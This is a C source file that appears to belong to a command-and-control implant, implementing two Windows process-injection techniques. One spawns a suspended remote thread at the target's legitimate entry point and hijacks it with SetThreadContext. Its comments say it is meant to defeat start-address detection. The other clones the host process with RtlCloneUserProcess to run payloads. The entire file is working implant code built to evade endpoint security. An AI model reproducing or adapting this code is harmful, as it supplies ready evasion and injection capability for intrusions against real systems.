/*
 * Tier-2 item 7 (4.11/4.12 injection-technique family):
 *
 *  - PI_EXEC_OBFSETTHREADCONTEXT (0x09): CreateRemoteThread(suspended) with
 *    the thread start address set to the target's own image entry point,
 *    then SetThreadContext to the payload. The kernel-recorded StartAddress
 *    stays a legitimate image entry, which is the whole point of the 4.11
 *    default technique (defeats Get-InjectedThreadEx-style start-address
 *    checks). x64 -> x64 only.
 *
 *  - PI_EXEC_DIRTYVANITY (0x0A): fork&run through RtlCloneUserProcess - the
 *    patsy is a CLONE of our own host process (identical, legitimate image)
 *    instead of a freshly spawned binary. x64 only. Applied at the spawn
 *    sites (command_inject / command_job_spawn_logic), not in the execute
 *    chain itself, because it replaces the patsy rather than the trigger.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "syscalls.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
typedef NTSTATUS(NTAPI *fRtlCloneUserProcess)(ULONG, void *, HANDLE *, HANDLE *);
typedef NTSTATUS(NTAPI *fNtQueryInformationProcess)(HANDLE, ULONG, void *, ULONG, ULONG *);

/* minimal winternl shape (avoid header dependencies) */
typedef struct _T2_PBI {
	void     * Reserved1;
	void     * PebBaseAddress;
	void     * Reserved2[2];
	ULONG_PTR  UniqueProcessId;
	void     * Reserved3;
} T2_PROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define CLONE_PROCESS_FLAGS     0x00000001

/* walk the remote process's PEB to its EXE entry point (x64 layouts) */
static void * remote_exe_entry_x64(HANDLE hProcess) {
	fNtQueryInformationProcess pQIP;
	unsigned char              peb[0x20];
	unsigned char              dos[0x40];
	unsigned char              nth[0x60];
	void                     * pebaddr = NULL;
	unsigned long long         imagebase = 0;
	unsigned long              e_lfanew = 0;
	unsigned long             * aoep;
	SIZE_T                     got = 0;
	T2_PROCESS_BASIC_INFORMATION pbi;

	pQIP = (fNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQIP == NULL) {
		return NULL;
	}

	ZeroMemory(&pbi, sizeof(pbi));
	if (pQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0 || pbi.PebBaseAddress == NULL) {
		return NULL;
	}

	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		return NULL;
	}

	e_lfanew = *(unsigned long *)(dos + 0x3c);
	if (e_lfanew == 0 || e_lfanew > 0x400) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase + e_lfanew, nth, 0x60, &got) || got != 0x60) {
		return NULL;
	}

	if (nth[0] != 'P' || nth[1] != 'E') {
		return NULL;
	}

	/* OptionalHeader starts at NT headers + 0x18; AddressOfEntryPoint at +0x10 */
	aoep = (unsigned long *)(nth + 0x18 + 0x10);
	return (void *)(DWORD_PTR)((unsigned char *)(DWORD_PTR)imagebase + *aoep);
}

/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		return FALSE;
	}

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		return FALSE;
	}

	ZeroMemory(&c, sizeof(c));
	c.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	c.Rcx = (DWORD64)lpParameter;
	c.Rip = (DWORD64)lpStartAddress;

	if (!SetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	return TRUE;
#endif
}

/* does the configured process-inject execute chain contain this opcode? */
BOOL procinj_execute_has(BYTE opcode) {
	char * options = setting_ptr(SETTING_PROCINJ_EXECUTE);
	datap  parser;
	DWORD  op;

	if (options == NULL) {
		return FALSE;
	}

	data_init(&parser, options, 128);

	while (TRUE) {
		op = data_byte(&parser);

		if (op == PI_EXEC_FAIL) {
			return FALSE;
		}

		if (op == opcode) {
			return TRUE;
		}

		/* skip opcode-specific payloads */
		if (op == PI_EXEC_CREATETHREAD_F || op == PI_EXEC_CREATEREMOTETHREAD_F) {
			data_short(&parser);
			data_string_asciiz(&parser);
			data_string_asciiz(&parser);
		}
	}
}

/* 4.12 DirtyVanity fork&run: clone our own host process instead of spawning
 * a patsy, then run the payload through the normal inject chain (the clone's
 * initial thread arrives suspended, so SetThreadContext-style opcodes work).
 * Returns FALSE when cloning is unavailable so callers fall back to a patsy. */
BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
	fRtlCloneUserProcess      pClone;
	HANDLE                    hClone = NULL;
	HANDLE                    hThread = NULL;
	PROCESS_INFORMATION       pi;
	INJECTCONTEXT             ctx;

#if !defined _M_X64
	return FALSE;
#endif

	pClone = (fRtlCloneUserProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCloneUserProcess");
	if (pClone == NULL) {
		return FALSE;
	}

	if (pClone(CLONE_PROCESS_FLAGS, NULL, &hClone, &hThread) != 0 || hClone == NULL || hThread == NULL) {
		return FALSE;
	}

	ZeroMemory(&pi, sizeof(pi));
	pi.hProcess   = hClone;
	pi.hThread    = hThread;
	pi.dwProcessId = GetProcessId(hClone);

	/* pi != NULL marks the context suspended (the clone's initial thread) */
	populate_inject_context(&ctx, &pi, hClone, pi.dwProcessId);

	/* run the configured execute chain inside the clone */
	inject_process_logic(&pi, hClone, pi.dwProcessId, dll, dllen, 0, parameter, plen);

	return TRUE;
}
